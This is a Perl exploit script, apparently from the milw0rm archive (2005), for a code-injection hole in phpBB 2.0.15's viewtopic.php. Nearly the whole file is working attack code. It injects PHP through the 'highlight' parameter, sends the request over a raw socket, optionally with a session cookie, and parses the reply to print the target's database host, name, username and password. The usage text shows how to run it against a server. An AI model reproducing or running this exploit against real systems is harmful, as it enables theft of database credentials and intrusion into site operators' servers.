#!/usr/bin/perl

# tested and working /str0ke

#        ********************************************************************
#       **********************************************************************
#      ****                                                                 **
#     ***      ******       *******************                             **
#    ***    ***   ****   ***********************                            **
#   ***   ***     ****                       ****      *   ***    *****     **
#  ***   ***      ***                ***     ***      *  **  **   **        **
# ***   ***                         ***      **         **   **  **         **
#***   ***                          ***    ***          **   **  *****      **
#**   ***                          ***  ****           **   **      **      **
#**   ***       ***  ***   ******* *******             **  ***      **      **
#**   ***      ***   ***  **      *** ***              **  **  **  **       **
#**  ***      ***   ***  **      ***  ***               ***   *****         **
#**   ***     ***   *** **       ***  ***                                   **
#**   ****   ***    ****        ***   ***                                   **
#**     *******    ****   ********     ***********************************  **
#**         ***                                                             **
#**        ***                                                              **
#**                                                                         **
#**      phpBB 2.0.15 Viewtopic.PHP Remote Code Execution Vulnerability     **
#**      This exploit gives the user all the details about the database     **
#**      connection such as database host, username, password and           **
#**      database name.                                                     **
#**                                                                         **
#**              Written by SecureD,  gvr.secured<AT>gmail<DOT>com,2005     **
#**                                                                         **
#**      Greetings to GvR, Jumento, PP, CKrew & friends      		        **
#**                                                                         **
#***************************************************************************** 
# ***************************************************************************

use IO::Socket;

print "+-----------------------------------------------------------------------+\r\n";
print "|           PhpBB 2.0.15 Database Authentication Details Exploit        |\r\n";
print "|                 By SecureD gvr.secured<AT>gmail<DOT>com               |\r\n";
print "+-----------------------------------------------------------------------+\r\n";

if (@ARGV < 3)
{
print "Usage:\r\n";
print "phpbbSecureD.pl SERVER DIR THREADID COOKIESTRING\r\n\r\n";
print "SERVER         - Server where PhpBB is installed.\r\n";
print "DIR            - PHPBB directory or / for no directory.\r\n";
print "THREADID       - Id of an existing thread.\r\n";
print "COOKIESTRING   - Optional, cookie string of the http request.\r\n";
print "                 Use this when a thread needs authentication for viewing\r\n";
print "                 You can use Firefox in combination with \"Live HTTP\r\n";
print "                 Headers\" to get this cookiestring.\r\n\r\n";
print "Example 1 (with cookiestring):\r\n";
print "phpbbSecured.pl 192.168.168.123 /PHPBB/ 8 \"phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=10dae92b780914332896df43808c4e09\" \r\n\r\n";
print "Example 2 (without cookiestring):\r\n";
print "phpbbSecured.pl 192.168.168.123 /PHPBB/ 20 \r\n";
exit();
}

$serv 		= $ARGV[0];
$dir 		= $ARGV[1];
$threadid 	= $ARGV[2];
$cookie 	= $ARGV[3];

$serv 		=~ s/http:\/\///ge;
$delimit 	= "GvRSecureD";

$sploit	 = $dir . "viewtopic.php?t=";
$sploit .= $threadid;
$sploit .= "&highlight='.printf($delimit.";
$sploit .= "\$dbhost.";
$sploit .= "$delimit.";
$sploit .= "\$dbname.";
$sploit .= "$delimit.";
$sploit .= "\$dbuser.";
$sploit .= "$delimit.";
$sploit .= "\$dbpasswd.";
$sploit .= "$delimit).'";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80") or die "[+] Connecting ... Could not connect to host.\n\n";

print "[+] Connecting      OK\n";
sleep(1);

print "[+] Sending exploit ";
print $sock "GET $sploit HTTP/1.1\r\n";
print $sock "Host: $serv\r\n";
if ( defined $cookie) {
	print $sock "Cookie: $cookie \r\n";
}
print $sock "Connection: close\r\n\r\n";


$succes = 0;

while ($answer = <$sock>) {
	$delimitIndex = index $answer, $delimit;
	if ($delimitIndex >= 0) {
		$succes = 1;
		$urlIndex = index $answer, "href";
		if ($urlIndex < 0){
			$answer = substr($answer, length($delimit));
			$length = 0;
			while (length($answer) > 0) {
				$nex = index($answer, $delimit);
				if ($nex > 0) {
					push(@array, substr($answer, 0, $nex));
					$answer = substr($answer, $nex + length($delimit), length($answer));
				} else {
					$answer= "";
				}
			}
		}
	}
}

close($sock);

if ($succes == 1) {
	print "OK\n";
	sleep(1);
	print "[+] Database Host:  " . $array[0] . "\n";
	sleep(1);
	print "[+] Database Name:  " . $array[1] . "\n";
	sleep(1);
	print "[+] Username:       " . $array[2] . "\n";
	sleep(1);
	print "[+] Password:       " . $array[3] . "\n";
	sleep(1);
} else {
	print "FAILED\n";
}

# milw0rm.com [2005-07-03]